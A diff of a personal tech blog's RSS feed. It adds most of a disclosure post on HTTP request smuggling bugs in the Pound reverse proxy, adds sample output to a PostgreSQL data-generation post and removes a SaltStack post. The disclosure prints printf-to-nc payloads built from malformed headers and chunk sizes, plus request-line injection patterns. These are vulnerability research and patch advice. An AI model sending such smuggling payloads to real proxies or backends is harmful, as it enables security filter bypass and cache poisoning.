+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39; zorg\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 57\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;5) Transmission issues&lt;/h3&gt;
+
+&lt;p&gt;This strange ops-fold syntax transmitted could be a problem. This was removed in version 2.8.
+Usually the Reverse proxy which support ops-fold are not transmitting the syntax (everything back on one line).&lt;/p&gt;
+
+&lt;p&gt;They were other transmission issues like this one (sadly not fixed):&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0000000000000000000000000000042\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is not an invalid query. The first chunk size is &lt;code&gt;42&lt;/code&gt; in hexa, so 66 bytes.
+The second chunk is the end-of-chunks marker, the last 2 lines &lt;code&gt;0\r\n\r\n&lt;/code&gt;.
+The &lt;code&gt;GET /tmp/&lt;/code&gt; query does not exists, it's just some uninterpreted bytes in the first chunk body of 66 bytes.&lt;/p&gt;
+
+&lt;p&gt;But if you use wireshark you will detect that this message is transfered as-is,
+the &lt;code&gt;0000000000000000000000000000042&lt;/code&gt; is not rewitten as &lt;code&gt;42&lt;/code&gt; or &lt;code&gt;042&lt;/code&gt;.
+That's still officially not an issue. The problem is that this syntax is sometimes
+an issue for some backends (chunk size attribute truncation issues) where
+you may read this &lt;code&gt;0000000000000000000000000000042&lt;/code&gt; as &lt;code&gt;00000000000000000&lt;/code&gt; and wrongly detect it
+as an end-of-chunks marker. And then discover the (false) &lt;code&gt;GET /tmp/&lt;/code&gt; query.&lt;/p&gt;
+
+&lt;p&gt;Of course the security issue here is on the backend, not Pound. But &lt;strike&gt;shi&lt;/strike&gt;things happens.&lt;/p&gt;
+
+&lt;p&gt;Some other transmissions issues were fixed, like these strange syntax:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /url?foo=[SOMETHING]HTTP/0.9 HTTP/1.1\r\n
+or
+GET /url?foo=[SOMETHING]Host:example.com, HTTP/1.1\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;with [SOMETHING] = BACKSPACE or CR or BEL or FORMFEED or HTAB or VTAB.&lt;/p&gt;
+
+&lt;h2&gt;Severity&lt;/h2&gt;
+
+&lt;p&gt;Bad HTTP syntax parsing is a security issue, the main problem is that any bad
+HTTP actor in a network of HTTP actors becomes the hammer and previous actors
+becomes nails.&lt;/p&gt;
+
+&lt;p&gt;The actor which suffers from Request splitting is the one which wrongly read a garbage body and extract a query from it.
+No other preceding actor could filter this query before because it was just a body (security filter bypass).
+And No one is expecting this query response (cache poisoning, etc.).&lt;/p&gt;
+
+&lt;p&gt;That's why the RFC has some minimal requirements on syntax parsing around message size.&lt;/p&gt;
+
+&lt;p&gt;On most installations Pound will be the SSL terminator, usually the &lt;strong&gt;first server side actor&lt;/strong&gt; in the chain.&lt;/p&gt;
+
+&lt;p&gt;In this position the request splitting attacks are hard to exploit, maybe it could be used to poison a Forward proxy on client side, maybe.
+But it cannot be used to attack the backends.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;_____________________________              _________________________________
+|      Client Side          |              |     Server Side               |
+Browser ---&amp;gt; Forward proxy ------Internet---&amp;gt; Pound ---&amp;gt; Varnish ---&amp;gt; Nginx
+                    NAIL? &amp;lt;================== HAMMER?
+                                              NAIL? &amp;lt;==== HAMMER?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Maybe some other HTTPS load balancers are present in front of Pound, on some big installations,
+that would be more dangerous as Pound could be used to send some extra responses to these proxys (WAFs?).&lt;/p&gt;
+
+&lt;p&gt;But on this position the most effective issues, on an attacker point of view,
+are transmission issues, where bad crafted headers are transmitted to backends by Pound. Because &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-2086&quot;&gt;on&lt;/a&gt; &lt;a href=&quot;http://dev.eclipse.org/mhonarc/lists/jetty-announce/msg00123.html&quot;&gt;the&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-6816&quot;&gt;backends&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-8743&quot;&gt;you&lt;/a&gt; &lt;a href=&quot;https://trac.nginx.org/nginx/ticket/762&quot;&gt;could&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-8852&quot;&gt;have&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-3183&quot;&gt;some&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-5739&quot;&gt;issues&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-5740&quot;&gt;and&lt;/a&gt; it's always a bad idea to send bad queries to backends.&lt;/p&gt;
+
+&lt;p&gt;If you look at the two main errors, Double Content Length and no respect of chunked priority, it is more dangerous on a backend than on a front.
+This, in my mind, reduces the impact of exploitations of these issues. I may be wrong. But transmissions issues,
+which are more dangerous for the ecosystem, are usually not even considered as security issues,
+because the Proxy is not doing any splitting, just forwarding some dangerous syntax.&lt;/p&gt;
+
+&lt;h2&gt;I use Pound, what can I do?&lt;/h2&gt;
+
+&lt;p&gt;First of all you can use Pound 2.8. Or a 2.7.x with the patchs.&lt;/p&gt;
+
+&lt;p&gt;If the fixed package is not available on your distribution you can &lt;strong&gt;easily&lt;/strong&gt; compile Pound 2.8. I made several compilations of Pound on jessie and stretch docker environements without any complexity (configure/make/make install).&lt;/p&gt;
+
+&lt;p&gt;Then you can also follow the Debian team and check for more active alternatives. &lt;a href=&quot;http://www.haproxy.org/&quot;&gt;Haproxy&lt;/a&gt; for example.&lt;/p&gt;
+
+&lt;h2&gt;Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;2016-09-05: reports to project maintainers&lt;/li&gt;
+&lt;li&gt;2016-09-08: some more reports&lt;/li&gt;
+&lt;li&gt;2016-10-23: version 2.8a (experimental) &lt;a href=&quot;http://www.apsis.ch/pound/pound_list/archive/2016/2016-10/1477235279000&quot;&gt;published&lt;/a&gt;, with all the fixs, &lt;em&gt;request smuggling&lt;/em&gt; is used in the announce, not the word &lt;em&gt;security&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;2018-01-15: asking project maintainer for CVE. Yes, quite late, I'm not always working on this subject :-)&lt;/li&gt;
+&lt;li&gt;2018-01-29: CVE Id reserved by me and transfered to the vendor&lt;/li&gt;
+&lt;li&gt;2018-02-13: pound fixed On &lt;a href=&quot;https://lists.debian.org/debian-lts-announce/2018/02/msg00015.html&quot;&gt;debian7 Wheezy (old)&lt;/a&gt;, patch proposed &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=888786&quot;&gt;for jessie and stretch&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;2018-02-24: pound removed from Debian unstable&lt;/li&gt;
+&lt;li&gt;2018-05-11: Pound &lt;a href=&quot;http://www.apsis.ch/pound/pound_list/archive/2018/2018-05/1526034164000#1526034164000&quot;&gt;2.8 released&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;2018-07-03: this page&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;h2&gt;See also&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=dVU9i5PsMPY&quot;&gt;Defcon HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf&quot;&gt;Defcon support&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=lY_Mf2Fv7kI&quot;&gt;Defcon demos&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+				<published>2018-07-03 00:00:00 +0200</published>
+				<link>http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/</link>
+			</item>
+		
+			<item>
 				<title>PostgreSQL, advanced use of generate_series for data generation</title>
 				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://www.makina-corpus.com/blog/metier/2017/postgresql-utilisations-avancees-de-generate_series-pour-generer-du-contenu&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
 &lt;small&gt;estimated read time: 10-15min&lt;/small&gt;&lt;/p&gt;
@@ -30,7 +475,7 @@ and these dates have some constraints between each other, and cannot be in the f
 For example to apply a functionnal process that need to be applied in production later and control the speed
 of this process. Or simply to test that our indexation plan is right.&lt;/p&gt;
 
-&lt;p&gt;Some tools exists, able to generate content. In the Dango world, for example,
+&lt;p&gt;Some tools exists, able to generate content. In the Django world, for example,
 you could use &lt;a href=&quot;https://factoryboy.readthedocs.io/en/latest/&quot;&gt;Factory Boy&lt;/a&gt;, or &lt;a href=&quot;https://djangopackages.org/grids/g/fixtures/&quot;&gt;others&lt;/a&gt;. But here we'll show how to generate this same type of data in a quite &lt;em&gt;simple&lt;/em&gt; manne,
 &lt;strong&gt;using SQL&lt;/strong&gt; directly, in a very very fast way (fast enough to be added in a
 functionnal test setUp).&lt;/p&gt;
@@ -137,7 +582,19 @@ And of course i need these dates in a random order, but with an increment that I
 
 &lt;p&gt;THe source code of this sub group of 1083 lines each giving 3 dates &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/generate_date_set.sql&quot;&gt;is here&lt;/a&gt; and we can &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/193&quot;&gt;see it in action with SQLFidlle&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;This sort of data grouyp can be used in my request like a table by using the keyword &lt;code&gt;WITH&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; rownum |           base_date           |       date_up_to_7_days       |      date_up_to_3_months
+--------+-------------------------------+-------------------------------+-------------------------------
+      1 | 2016-12-12 11:49:32.811583+01 | 2016-12-15 22:20:32.811583+01 | 2017-06-27 18:34:32.811583+02
+      2 | 2017-02-24 06:21:32.811583+01 | 2017-03-01 07:36:32.811583+01 | 2017-06-27 18:34:32.811583+02
+      3 | 2012-06-28 08:40:32.811583+02 | 2012-07-02 15:06:32.811583+02 | 2014-02-22 07:16:32.811583+01
+      4 | 2007-12-05 17:55:32.811583+01 | 2007-12-10 17:35:32.811583+01 | 2008-07-19 06:27:32.811583+02
+      5 | 2014-01-09 18:48:32.811583+01 | 2014-01-10 22:10:32.811583+01 | 2014-10-25 19:48:32.811583+02
+      6 | 2007-08-23 01:56:32.811583+02 | 2007-08-28 17:25:32.811583+02 | 2007-12-20 02:12:32.811583+01
+      7 | 2017-01-01 00:54:32.811583+01 | 2017-01-05 06:28:32.811583+01 | 2017-06-27 18:34:32.811583+02
+      8 | 2014-05-16 11:14:32.811583+02 | 2014-05-16 21:10:32.811583+02 | 2016-03-24 09:57:32.811583+01
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This sort of data group can be used in my request like a table by using the keyword &lt;code&gt;WITH&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- here the big dates select ...&lt;/span&gt;
@@ -251,6 +708,20 @@ to get more various profils, to insert some &lt;code&gt;NULL&lt;/code&gt; someti
 
 &lt;p&gt;We can of course &lt;a href=&quot;http://sqlfiddle.com/#!17/ec332/2&quot;&gt;see it in SQL Fiddle&lt;/a&gt; where
 the model is already present, as we need the company table to get the right email column.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; id  | con_active | con_first_name |   con_last_name    |                        mail                        |          date_create          |       date_1st_interact       |       date_2nd_interact       |          date_alter           | con_status | comp_id
+-----+------------+----------------+--------------------+----------------------------------------------------+-------------------------------+-------------------------------+-------------------------------+-------------------------------+------------+---------
+   1 | t          | Coaïco         | Takalaerjac        | coaico.takalaerjac@cocaco-global.com               | 2017-06-16 10:41:28.631596+02 | 2017-06-21 04:01:28.631596+02 | 2017-06-27 18:39:28.631596+02 | 2017-06-27 18:39:28.631596+02 | commercial |    4091
+   2 | t          | Nnn            | Otoerkingchen      | nnn.otoerkingchen@sefrafor-international.com       | 2016-03-12 04:25:28.631596+01 | 2016-03-15 07:34:28.631596+01 | 2016-10-22 05:57:28.631596+02 | 2016-10-22 05:57:28.631596+02 | external   |    6055
+   3 | t          | Cosyso         | Steinroytakavur    | cosyso.steinroytakavur@gecgipfor-global.com        | 2016-12-16 10:35:28.631596+01 | 2016-12-18 18:11:28.631596+01 | 2016-12-18 18:11:28.631596+01 | 2016-12-18 18:11:28.631596+01 | production |     651
+   4 | t          | Michavir       | Ersteinotovur      | michavir.ersteinotovur@gefroca-international.com   | 2012-10-29 12:27:28.631596+01 | 2012-11-03 10:41:28.631596+01 | 2013-06-19 11:21:28.631596+02 | 2013-06-19 11:21:28.631596+02 | external   |    2731
+   6 | t          | Ennathche      | Latakamcata        | ennathche.latakamcata@gecforgim-united.com         | 2016-12-15 12:29:28.631596+01 | 2016-12-19 11:12:28.631596+01 | 2017-06-27 18:39:28.631596+02 | 2017-06-27 18:39:28.631596+02 | external   |    8740
+   8 | f          |                | Durjactakao'       | borob.durjactakao-@forfrafor-gmbh.com              | 2014-01-13 16:36:28.631596+01 | 2014-01-17 19:08:28.631596+01 | 2014-01-17 19:08:28.631596+01 | 2014-01-17 19:08:28.631596+01 | external   |    1902
+   9 | t          | Jamibo         | Jacsteinlason      | jamibo.jacsteinlason@gimgipgim-international.com   | 2011-11-30 08:29:28.631596+01 |                               |                               | 2011-11-30 08:29:28.631596+01 | support    |    3024
+  10 | t          | Nathhnnath     | Vurfürsteinking    | nathhnnath.vurfursteinking@sosegip-sons.com        | 2014-08-29 00:10:28.631596+02 | 2014-09-04 05:25:28.631596+02 | 2014-09-04 05:25:28.631596+02 | 2014-09-04 05:25:28.631596+02 | support    |    6006
+  13 | t          | Chepeche       | Kleindurotoking    | chepeche.kleindurotoking@sogegec-global.com        | 2011-07-25 03:06:28.631596+02 | 2011-07-28 14:17:28.631596+02 | 2013-08-08 10:32:28.631596+02 | 2013-08-08 10:32:28.631596+02 | direction  |     477
+(...)
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;We'll then need to insert those lines into the contact table. As we could see before on the above pseudo-query.
 After the &lt;code&gt;WITH&lt;/code&gt; section we have a &lt;code&gt;SELECT&lt;/code&gt; query, the &lt;code&gt;INSERT INTO contact&lt;/code&gt; part has to be paste just before this select.
@@ -2757,457 +3228,6 @@ apache:
 </description>
 				<published>2014-01-28 00:00:00 +0100</published>
 				<link>http://regilero.github.io/saltstack/english/2014/01/28/saltstack_merge_dictionaries_of_settings_with_grains_filter_by/</link>
-			</item>
-		
-			<item>
-				<title>SaltStack, Use file.accumulated accumulators with file.managed and file.blockreplace</title>
-				<description>&lt;p&gt;&lt;a href=&quot;/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/&quot;&gt;On the last salt-stack post&lt;/a&gt; we saw a first step by step usage of &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;&lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt;. On this post we'll study usage of state accumulators with &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt;. Accumulators are used to collect data on several states and let you use this data on other file states (Actually only the blockreplace and managed states).&lt;/p&gt;
-
-&lt;p&gt;You can find the examples used on this post on &lt;a href=&quot;https://github.com/regilero/regilero-blog-examples/tree/master/accumulated-blockreplace&quot;&gt;this github repository&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2&gt;Why using accumulated accumulators?&lt;/h2&gt;
-
-&lt;p&gt;Let's start by the needs. What sort of problems could be solved by accumulators?. In fact, the idea is to use states executed before a final state. And this state ordering can be solved using requisites or orders. On theses first states you &lt;strong&gt;collect data&lt;/strong&gt; for later usage. Then, on the final state, you have a dictionary containing this collected data, the &lt;em&gt;accumulator&lt;/em&gt; dictionary, and you can do what you want with it with jinja, or even without jinja in the blockreplace case. Note that you only collect data in the current highstate execution, so all accumulators must run (be included) if you need the data at the end.&lt;/p&gt;
-
-&lt;p&gt;You can use this system to record one or more lists of things likes users, services, addresses, configuration commands or wathever else you want, while running the states. And all theses states recording data will have to run before the one using that data for something (writing theses lists on a targeted file). Doing that you will avoid doing the write operation after each new record, you will wait for the final list before doing the write. This will be faster, but also easier to manage. Inserting, updating and removing data in a file, in one shot.&lt;/p&gt;
-
-&lt;p&gt;In this post I will use two examples, one for a managed file and one for a blockreplace edited file. The first example is an apache configuration file with several states adding some inputs inside. The second example will fill a list of DNS IP-name associations that should be added in a hosts file.&lt;/p&gt;
-
-&lt;h2&gt;States ordering&lt;/h2&gt;
-
-&lt;p&gt;As I said before states ordering is very important here. The final step must be final. And used states may be split upon several sls files. You can use the order &lt;code&gt;order&lt;/code&gt; keyword to ensure the final order, this way:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# first.sls&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID1&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID1&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;100&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# second.sls&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo last&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;900&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# third sls&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID3&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID3&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;200&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;This will make a final execution order of:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID1&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID3&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo last&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;But to do that you need an ordering schema for all you states. I do not find that very useful when you have a lot of states.&lt;/p&gt;
-
-&lt;p&gt;The second way of ordering states is using &lt;a href=&quot;http://docs.saltstack.com/ref/states/requisites.html&quot;&gt;&lt;code&gt;requisites&lt;/code&gt;&lt;/a&gt;. Using this method you can declare dependencies between states. But having a list of all the states that collects data into accumulators, and eediting this list on the state using the accumulator would be quite hard. The best thing here is to use the &lt;code&gt;*_in&lt;/code&gt; form of the requisites, to declare the dependency from the dependent state. When adding a new state using the accumulator the dependency will have to be set in this state and not in the previous managed state entry.&lt;/p&gt;
-
-&lt;p&gt;So using &lt;code&gt;require_in&lt;/code&gt; the previous example would be:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# first.sls&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID1&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
